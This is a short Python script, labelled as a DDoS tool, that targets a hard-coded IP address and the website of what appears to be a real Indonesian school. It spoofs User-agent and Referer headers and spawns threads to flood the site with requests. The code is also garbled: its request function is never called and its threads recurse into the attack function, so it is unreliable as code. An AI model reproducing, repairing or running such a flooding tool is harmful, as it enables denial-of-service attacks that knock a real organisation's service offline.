import requests
import time
import threading


target_ip = "103.74.5.27"

def sen(url, header):
    try:
        response = requests.get(url=url, headers=header)
        print(response.status_code)
    except Exception as e:
        print(f"Error: {e}")

def ddos(target_ip):
    url = f"https://smksekarbuminusantara.sch.id"
    header = {
        "User-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "User-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "User-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.3",
        "User-agent" : "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1 Ddg/17.",
        "User-agent" : "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.3",
        "User-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "User-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
        "User-agent" : "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "User-agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/114.0.0.0",

        "Referer" : "https://www.google.com/",
        "Referer" : "https://www.facebook.com/",
        "Referer" : "https://github.com/",
        "Referer" : "https://www.x.com/",
        "Referer" : "https://www.telegram.com/",
        "Referer" : "https://smksekarbuminusantara.sch.id",
    }

    adi = {
        time.sleep(1)
    }           

    thread = []

    user = int(input("Masukan limit :"))

    for i in range(user):
        t = threading.Thread(target=ddos, args=(target_ip,))
        t.start()
        thread.append(t)
        time.sleep(0.1)
        print(f"{t}")

    for t in thread:
        t.join()


if __name__ == "__main__":
    ddos(target_ip)